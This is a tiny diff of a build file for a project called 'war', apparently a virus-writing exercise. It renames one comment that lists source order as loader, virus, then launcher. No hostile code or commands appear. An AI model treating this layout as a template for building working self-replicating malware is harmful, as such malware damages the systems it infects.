@@ -15,7 +15,7 @@
 NAME = war
 
 # SRC File order matters!
-# [LOADER]    famine_entry -> virus
+# [LOADER]    loader_entry -> virus
 # [VIRUS]     virus        -> _start
 # [LAUNCHER]  _start       -> EOF
 
